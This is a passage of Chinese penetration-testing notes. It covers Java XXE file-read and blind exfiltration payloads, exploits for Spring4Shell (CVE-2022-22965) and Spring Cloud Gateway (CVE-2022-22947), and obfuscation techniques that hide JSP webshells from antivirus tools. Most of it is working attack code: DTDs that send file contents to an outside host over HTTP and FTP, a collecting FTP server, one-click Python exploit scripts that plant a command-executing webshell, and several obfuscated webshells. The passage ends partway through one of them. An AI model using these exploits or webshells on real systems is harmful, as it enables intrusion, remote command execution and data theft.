POST /xxe/DocumentBuilder_return HTTP/1.1
Host: 127.0.0.1:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,de;q=0.7,fr;q=0.6,da;q=0.5,mt;q=0.4
Connection: close
Content-Type: application/xml
Content-Length: 133

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE joychou [
    <!ENTITY xxe SYSTEM "file:///tmp/1.txt">
]>
<root>&xxe;</root>
```

返回

```
#text: 1111
~!@#%^%'">
2222
➜ cat 1.txt
1111
~!@#%^%'">
2222
```

在 XML 元素中，"<" 和 "&" 是非法的。"<" 会产生错误，因为解析器会把该字符解释为新元素的开始。"&" 也会产生错误，因为解析器会把该字符解释为字符实体的开始。

可以将脚本代码定义为 CDATA。CDATA 部分中的所有内容都会被解析器忽略。CDATA 部分由 "" 结束。具体利用方式可以查看https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/ 文章。但我在测试用CDATA，并没有读取`<&`成功。Payload如下：

```
-------------------------------------------------------------
post data:
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % stuff SYSTEM "file:///tmp/1.txt">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://test.joychou.org/cdata.dtd">
    %dtd;
]>
<root>&all;</root>


cdata.dtd:
<!ENTITY all "%start;%stuff;%end;">

-------------------------------------------------------------

post data:
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://test.joychou.org/cdata.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>


cdata.dtd:
<!ENTITY % file SYSTEM "file:///tmp/1.xt">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">

-------------------------------------------------------------
```

##### 4.2 Blind（无回显）

在这份[XXE漏洞代码](https://github.com/JoyChou93/java-sec-code/blob/master/src/main/java/org/joychou/controller/XXE.java)中，需要设置Content-Type为`application/xml`，服务端才能获取到body内容。

```
POST /xxe/DocumentBuilder HTTP/1.1
Host: 127.0.0.1:8080
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,de;q=0.7,fr;q=0.6,da;q=0.5,mt;q=0.4
Connection: close
Content-Type: application/xml
Content-Length: 79

<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://test.joychou.org/evil.dtd">
```

payloads：

- 没有ENTITY关键字，可以用来Bypass WAF

```
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://test.joychou.org/evil.dtd">
```

- 有ENTITY关键字，可能会被WAF拦截

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://test.joychou.org/evil.dtd">%remote;]>
<root/>
```

evil.dtd代码：

http协议：

```
<!ENTITY % data SYSTEM "file:///tmp/x">
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'http://test.joychou.org/?data=%data;'>">
%payload;
%send;
```

ftp协议：

```
<!ENTITY % data SYSTEM "file:///etc/redhat-release">
<!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:fakepass@test.joychou.org:2121/%data;'>">
%payload;
%send;
```

或者将`%payload;`放在ftp的username或者password处。如果ftp不跟用户名或者密码`ftp://test.joychou.org:2121/%payload;`，利用FTP协议会接收到Java的版本。

```
New client connected
< USER anonymous
< PASS Java1.8.0_121@
< TYPE I
< EPSV ALL
< EPSV
< EPRT |1|172.17.29.150|60731|
< RETR test
< xxe
< ftp
```

FTP Server代码：

```
require 'socket'
server = TCPServer.new 2121
loop do
  Thread.start(server.accept) do |client|
    puts "New client connected"
    data = ""
    client.puts("220 xxe-ftp-server")
    loop {
        req = client.gets()
        puts "< "+req
        if req.include? "USER"
            client.puts("331 password please - version check")
        else
           #puts "> 230 more data please!"
            client.puts("230 more data please!")
        end
    }
  end
end
```

测试的结果(Centos)：

| Java版本  | 是否能读换行 | 被截断的字符 | 其他报错的字符(什么都不能读) | 被替换成换行的字符 |
| --------- | ------------ | ------------ | ---------------------------- | ------------------ |
| 1.7.0_80  | 是           | # ?          | % & '                        | /                  |
| 1.8.0_121 | 是           | # ?          | % & '                        | /                  |
| 1.8.0_181 | 否           | # ?          | % & '                        | /                  |

可能还有其他的字符和其他的Java版本没有测试。不过我猜测，自从Java 1.8的某个版本起，就不能读取换行。至于是那个版本开始，就不具体测试了，大家知道这个特性就好 -)

##### 4.3 支持Xinclude的XXE

2018年08月22日更新支持XInclude的XXE漏洞代码，详情见代码。

POC

```
<?xml version="1.0" ?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

# Spring相关漏洞

## Spring Framework RCE

CVE-2022-22965

https://paper.seebug.org/1877/

https://www.secpulse.com/archives/176618.html

### 前置

#### Bean处理和BeanWrapper

现在有两个 pojo 类，一个 User 和一个 UserInfo，User 类里套了个 UserInfo 类

```java
package com.moonsec;
public class User {
    private  String username;
    private  UserInfo info; // UserInfo 对象

    public UserInfo getInfo() {
        return info;
    }
    public void setInfo(UserInfo info) {
        this.info = info;
    }
    public String getUsername() {
        return username;
    }
    public void setUsername(String username) {
        this.username = username;
    }
}
```

```java
package com.moonsec;
public class UserInfo {
    private  int age;
    public int getAge() {
        return age;
    }
    public void setAge(int age) {
        this.age = age;
    }
}
```

接下来用 Demo 类来测试，使用 `org.springframework.beans.BeanWrapper` 来操作嵌套的 UserInfo 类里的属性

```java
package com.moonsec;
import org.apache.catalina.valves.AccessLogValve;
import org.springframework.beans.BeanWrapper;
import org.springframework.beans.PropertyAccessorFactory;

public class Demo {
    public static void main(String[] args) {
        User user = new User();
        BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(user);//属性访问器工厂。用于bean属性访问
        bw.setAutoGrowNestedPaths(true); //设置嵌套属性自动创建
        bw.setPropertyValue("username", "zf1yolo");
        bw.setPropertyValue("info.age", 20); // 设置 User 类里嵌套的 UserInfo 类里的 age 属性
        System.out.println("my name is "+user.getUsername()+" age: " +user.getInfo().getAge());
        // 输出：     my name is zf1yolo age: 20
    }
}
```

#### tomcat 的日志文件

日志文件位于 ：`\apache-tomcat-8.5.27\conf\server.xml`

```xml
<Host name="localhost"  appBase="webapps"
            unpackWARs="true" autoDeploy="true">

        <!-- SingleSignOn valve, share authentication between web applications
             Documentation at: /docs/config/valve.html -->
        <!--
        <Valve className="org.apache.catalina.authenticator.SingleSignOn" />
        -->

        <!-- Access log processes all example.
             Documentation at: /docs/config/valve.html
             Note: The pattern used is equivalent to using pattern="common" -->
        <Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"
               prefix="localhost_access_log" suffix=".txt"
               pattern="%h %l %u %t &quot;%r&quot; %s %b" />

      </Host>
```

其中：

- directory 日志目录
- prefix 文件名
- suffix 文件后缀
- pattern 写入文件内容
- org/apache/catalina/valves/AccessLogValve.java  这个文件文件也有相关的属性设置

### tomcat getshell

查看 payload： https://github.com/TheGejr/SpringShell/blob/master/exp.py

利用class对象构造利用链，**对Tomcat的日志配置进行修改，然后，向日志中写入shell**。 以下是一些相
关的解析

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=
构建文件的内容
class.module.classLoader.resources.context.parent.pipeline.first.suffix=
修改tomcat日志文件后缀
class.module.classLoader.resources.context.parent.pipeline.first.director
y=
写入文件所在的网站根目录
class.module.classLoader.resources.context.parent.pipeline.first.prefix=
写入文件名称
class.module.classLoader.resources.context.parent.pipeline.first.fileDate
Format=
文件日期格式（实际构造为空值即可）
```

利用Tomcat的AccessLogValue，写日志方式getshell

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
if("j".equals(request.getParameter("pwd"))){ java.io.InputStream in = %
{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new
byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %
{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.
classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classL
oader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resource
s.context.parent.pipeline.first.fileDateFormat=
```

参考：https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html

```
%{xxx}a write remote address (client) (xxx==remote) or connection
peer address (xxx=peer)
%{xxx}i write value of incoming header with name xxx (escaped if
required)
%{xxx}o write value of outgoing header with name xxx (escaped if
required)
%{xxx}c write value of cookie with name xxx (escaped if required)
%{xxx}r write value of ServletRequest attribute with name xxx
(escaped if required)
%{xxx}s write value of HttpSession attribute with name xxx (escaped
if required)
%{xxx}p write local (server) port (xxx==local) or remote (client)
port (xxx=remote)
%{xxx}t write timestamp at the end of the request formatted using the
enhanced SimpleDateFormat pattern xxx
```

#### 复现利用

vulhub环境

##### 手动利用

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: 192.168.0.103:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1
Content-Length: 2
```

<img src=".\图片\Snipaste_2023-03-21_16-11-09.png" alt="Snipaste_2023-03-21_16-11-09" style="zoom:67%;" />

Then, you can use the JSP webshell to execute arbitrary commands successfully:

```
http://192.168.0.103:8080/tomcatwar.jsp?pwd=j&cmd=id
```

<img src=".\图片\Snipaste_2023-03-21_16-10-11.png" alt="Snipaste_2023-03-21_16-10-11" style="zoom:80%;" />

##### 一键 exp

利用 exp 代码如下：

```python
#coding:utf-8
import requests
import argparse
from urllib.parse import urljoin

def Exploit(url):
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:

        go = requests.post(url,headers=headers, data=data, timeout=15, allow_redirects=False, verify=False)
        shellurl = urljoin(url, 'tomcatwar.jsp')
        shellgo = requests.get(shellurl, timeout=15, allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"The vulnerability exists, the shell address is :{shellurl}?pwd=j&cmd=whoami")
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Spring-Core Rce.')
    parser.add_argument('--file', help='url file', required=False)
    parser.add_argument('--url', help='target url', required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()
```

命令：`python exp.py --url http://192.168.0.103:8080`

发现写入网站路径写入 `tomcatwar.jsp`  后门文件
写入shell后会不断有日志写入
使用关闭写入日志payload
`class.module.classLoader.resources.context.parent.pipeline.first.enabled=false`

## Spring Cloud Gateway

CVE-2022-22947

### 1.Spring Cloud Gateway

Spring Cloud Gateway是Spring Cloud的一个全新项目，基于 Spring 5.0+Spring Boot 2.0 和 Project Reactor 等技术开发的网关，它旨在为微服务架构提供一种简单有效的统一的API路由管理方式。

Spring Cloud Gateway是基于WebFlux框架实现的，而WebFlux框架底层则使用了高性能的Reactor模式通信框架Netty。

Spring Cloud Gateway的目标提供统一的路由方式且基于Filter链的方式提供了网关基本的功能，如：安全、监控/指标、和限流。

Spring Cloud Gateway底层使用了高性能的通信框架Netty。

### 2.spring boot Actuator

Actuator是Springboot提供的用来对应用系统进行自省和监控的功能模块，借助于Actuator开发者可以很方便地对应用系统某些监控指标进行查看、统计等。

Spring Cloud Gateway与spring boot Actuator 关联

```
management.endpoint.gateway.enabled=true
management.endpoints.web.exposure.include=gateway
```

漏洞利用 开启了 actuator 获取路由信息

```
http://192.168.0.104:8080/actuator/gateway/routes
http://192.168.0.104:9000/actuator/gateway/globalfilters
http://192.168.0.104:9000/actuator/gateway/routefilters
```

### SpEL表达式

Spring Expression Language（简称 SpEL）是一种功能强大的表达式语言、用于在运行时查询和操作对
象图；语法上类似于 Unified EL，但提供了更多的特性，特别是方法调用和基本字符串模板函数。SpEL
的诞生是为了给 Spring 社区提供一种能够与 Spring 生态系统所有产品无缝对接，能提供一站式支持的
表达式语言。
https://blog.csdn.net/weixin_45794666/article/details/123372058

### 利用步骤

#### 手工

1、以 POST 方法请求 /actuator/gateway/routes/moonsec，并提交以下数据，用于创建一条恶意路由：

```
POST /actuator/gateway/routes/moonsec HTTP/1.1
Host: 192.168.0.104:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0)
Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/we
bp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 333
{
"id": "moonsec",
"filters": [{
"name": "AddResponseHeader",
"args": {
"name": "Result",
"value": "#{new
String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lan
g.Runtime).getRuntime().exec(new String[]{\"calc\"}).getInputStream()))}"
```

2、刷新路由

```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.0.104:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0)
Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/we
bp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
a=1
```

3、然后，发送如下数据包应用刚添加的路由。这个数据包将触发SpEL表达式的执行：
发送如下数据包即可查看执行结果：

```
GET /actuator/gateway/routes/moonsec HTTP/1.1
Host: 192.168.0.104:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0)
Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/we
bp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

4、最后，发送如下数据包清理现场，删除所添加的路由：

```
DELETE /actuator/gateway/routes/mooonsec HTTP/1.1
Host: 192.168.0.104:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0)
Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/we
bp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

再刷新下路由：

```
POST /actuator/gateway/refresh HTTP/1.1
Host: 192.168.0.104:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0)
Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/we
bp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-
US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
a=1
```

#### 一键exp

```python
import requests
import json
import base64
import re

payload1 = '/actuator/gateway/routes/WeianSec'
payload2 = '/actuator/gateway/refresh'
payload3 = '/actuator/gateway/routes/WeianSec'
headers = {
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Connection': 'close',
    'Content-Type': 'application/json'
}
proxies = {
    'http': 'http://192.168.1.119:8080'
}


data = 'ewogICJpZCI6ICJXZWlhblNlYyIsCiAgImZpbHRlcnMiOiBbewogICAgIm5hbWUiOiAiQWRkUmVzcG9uc2VIZWFkZXIiLAogICAgImFyZ3MiOiB7CiAgICAgICJuYW1lIjogIlJlc3VsdCIsCiAgICAgICJ2YWx1ZSI6ICIje25ldyBTdHJpbmcoVChvcmcuc3ByaW5nZnJhbWV3b3JrLnV0aWwuU3RyZWFtVXRpbHMpLmNvcHlUb0J5dGVBcnJheShUKGphdmEubGFuZy5SdW50aW1lKS5nZXRSdW50aW1lKCkuZXhlYyhuZXcgU3RyaW5nW117XCJDbWRcIn0pLmdldElucHV0U3RyZWFtKCkpKX0iCiAgICB9CiAgfV0sCiAgInVyaSI6ICJodHRwOi8vZXhhbXBsZS5jb20iCn0='

data1 = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': '0'
}

def exec():
    requests.post(url+payload1,headers=headers,data=base64.b64decode(data).decode().replace('Cmd',cmd),verify=False,timeout=5)
    requests.post(url+payload2,headers=headers,data=data1,verify=False,timeout=5)
    a = requests.get(url+payload3,headers=headers,verify=False,timeout=5).text
    exec = re.findall(r'Result = [\'"]?([^\'" )]+)', a)
    print(exec)

if __name__ == '__main__':
    url = input("Url:")
    cmd = input("Cmd:")
    exec()

```

<img src=".\图片\Snipaste_2023-03-21_16-28-13.png" alt="Snipaste_2023-03-21_16-28-13" style="zoom:80%;" />

### 漏洞分析

```java
static Object getValue(SpelExpressionParser parser, BeanFactory
beanFactory, String entryValue) {
Object value;
String rawValue = entryValue;
if (rawValue != null) {
rawValue = rawValue.trim();
}
if (rawValue != null && rawValue.startsWith("#{") &&
entryValue.endsWith("}")) {
// assume it's spel
StandardEvaluationContext context = new
StandardEvaluationContext();
context.setBeanResolver(new
BeanFactoryResolver(beanFactory));
Expression expression = parser.parseExpression(entryValue,
new TemplateParserContext());
value = expression.getValue(context);
}
else {
value = entryValue;
}
return value;
}
```

<img src=".\图片\Snipaste_2023-03-21_16-19-08.png" alt="Snipaste_2023-03-21_16-19-08" style="zoom:80%;" />

传入了恶意的 SpEL 表达式执行

# JSP免杀

## 原型

```jsp
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    Runtime rt = Runtime.getRuntime();
    String cmd = request.getParameter("cmd");
    Process process = rt.exec(cmd);
    java.io.InputStream in = process.getInputStream();
    // 回显
    out.print("<pre>");
    // 网上流传的回显代码略有问题，建议采用这种方式
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
```

## 反射调用

```jsp
<%@ page language="java" pageEncoding="UTF-8" %>
<%
    // 加入一个密码
    String PASSWORD = "password";
    String passwd = request.getParameter("pwd");
    String cmd = request.getParameter("cmd");
    if (!passwd.equals(PASSWORD)) {
        return;
    }
    // 反射调用
    Class rt = Class.forName("java.lang.Runtime");
    java.lang.reflect.Method gr = rt.getMethod("getRuntime");
    java.lang.reflect.Method ex = rt.getMethod("exec", String.class);
    Process process = (Process) ex.invoke(gr.invoke(null), cmd);
    // 类似上文做回显
    java.io.InputStream in = process.getInputStream();
    out.print("<pre>");
    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
    String s = null;
    while ((s = stdInput.readLine()) != null) {
        out.println(s);
    }
    out.print("</pre>");
%>
```

## 控制平坦化

一步步地执行，把反射调用的语句用 switch 来控制，死循环执行命令

```jsp
<%@ page language="java" pageEncoding="UTF-8" %>
<%
// 这里给出的是规定顺序的分发器
String dispenserArr = "0|1|2|3|4|5|6|7|8|9|10|11|12";
String[] b = dispenserArr.split("\\|");

int index = 0;
// 声明变量
String passwd = null;
String cmd = null;
Class rt = null;
java.lang.reflect.Method gr = null;
java.lang.reflect.Method ex = null;
Process process = null;
java.io.InputStream in = null;
java.io.InputStreamReader resulutReader = null;
java.io.BufferedReader stdInput = null;

while (true) {
    int op = Integer.parseInt(b[index++]);
    switch (op) {
        case 0:
            passwd = request.getParameter("pwd");
            break;
        case 1:
            cmd = request.getParameter("cmd");
            break;
        case 2:
            if (!passwd.equals(PASSWORD)) {
                return;
            }
            break;
        case 3:
            rt = Class.forName("java.lang.Runtime");
            break;
        case 4:
            gr = rt.getMethod("getRuntime");
            break;
        case 5:
            ex = rt.getMethod("exec", String.class);
            break;
        case 6:
            process = (Process) ex.invoke(gr.invoke(null), cmd);
            break;
        case 7:
            in = process.getInputStream();
            break;
        case 8:
            out.print("<pre>");
            break;
        case 9:
            resulutReader = new java.io.InputStreamReader(in);
            break;
        case 10:
            stdInput = new java.io.BufferedReader(resulutReader);
        case 11:
            String s = null;
            while ((s = stdInput.readLine()) != null) {
                out.println(s);
            }
            break;
        case 12:
            out.print("</pre>");
            break;
    }
}
%>
```

## 反射+反转字符串

把反射需要传入的字符串反转   Class rt = Class.forName("`java.lang.Runtime`");
                                                     java.lang.reflect.Method gr = rt.getMethod("`getRuntime`");
                                                     java.lang.reflect.Method ex = rt.getMethod("`exec`", String.class);

这个思路可以延伸，可以自定义一个加密函数和一个解密函数，在测试环境把这些关键字符串用加密函数加密，再把解密函数和解密后的字符串放入 webshell 中

```jsp
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.BufferedInputStream" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStreamReader" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    //字符串反转的函数
    public static String revstr(String str) {
        String line="";
        for(int i=0;i<str.length();i++){
            line=str.charAt(i)+line;

        }
        return line;
    }
%>
<%if (request.getParameter("cmd")!=null){
    String cmd=request.getParameter("cmd");
    Class c=Class.forName(revstr("emitnuR.gnal.avaj"));
    Method r = c.getMethod(revstr("emitnuRteg"), null);
    Method e = c.getMethod(revstr("cexe"), String.class);
    Process process=(Process) e.invoke( r.invoke(null,null),cmd);
    InputStream inputStream = process.getInputStream();
    int a=-1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=inputStream.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
    inputStream.close();
}
%>
```

## 反射+凯撒加密

还是在**反射需要传入的字符串**中做文章，此时是凯撒加密

```java
public static String destr(String str){      //解密函数
        String line="";
        for (int i=0;i<str.length();i++){
            char j = str.charAt(i);
            j=(char)(j - 2);
            line=line+j;
        }
        return line;
    }
    
public static String estr(String str){  //加密函数
        String line="";
        for (int i=0;i<str.length();i++){
            char j = str.charAt(i);
            j=(char)(j + 2);
            line=line+j;
        }
        return line;
    }    
```

jsp webshell如下：

```jsp
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.InputStream" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    public static String estr(String str){
        String line="";
        for (int i=0;i<str.length();i++){
            char j = str.charAt(i);
            j=(char)(j - 2);
            line=line+j;
        }
        return line;
    }
%>

<%if (request.getParameter("cmd")!=null){
    String cmd=request.getParameter("cmd");
    Class c=Class.forName(estr("lcxc0ncpi0Twpvkog"));
    Method r = c.getMethod(estr("igvTwpvkog"), null);
    Method e = c.getMethod(estr("gzge"), String.class);
    Process process=(Process) e.invoke( r.invoke(null,null),cmd);
    InputStream inputStream = process.getInputStream();
    int a=-1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=inputStream.read(b))!=-1){
        out.print(new String(b));
    }
    out.print("</pre>");
    inputStream.close();
}
%>
```

## BECL加密

准备一个恶意类 ByteCodeEvil

```java
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ByteCodeEvil {
    String res;
    public ByteCodeEvil(String cmd) throws IOException {
        StringBuilder stringBuilder = new StringBuilder().append("<pre>");
        BufferedReader bufferedReader = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream(),"GBK"));
        String line;
        while ((line = bufferedReader.readLine()) != null) {
            stringBuilder.append(line).append("\n");
        }
        stringBuilder.append("</pre");
        // 回显
        this.res = stringBuilder.toString();
    }

    @Override
    public String toString() {
        return this.res;
    }
}
```

转成 bcel字节：

```java
import com.sun.org.apache.bcel.internal.classfile.Utility;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class ToBecl {
    public static void main(String[] args) throws IOException {
        String encode = Utility.encode(Files.readAllBytes(Paths.get("E:\\渗透笔记\\Java\\Project\\webshell123\\target\\classes\\ByteCodeEvil.class")), true);
        System.out.println("$$BCEL$$" + encode);
    }
}
```

再把生成的 BECL 字节码放入 webshell 中 ，反射调用 `com.sun.org.apache.bcel.internal.util.ClassLoader` 来加载这个 becl 字节码，加载后再反射调用恶意类 `ByteCodeEvil` 的构造方法

```jsp
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%if (request.getParameter("code")!=null);
    String code=request.getParameter("code");
    Class c =Class.forName("com.sun.org.apache.bcel.internal.util.ClassLoader");
    ClassLoader loader = (ClassLoader)c.newInstance();
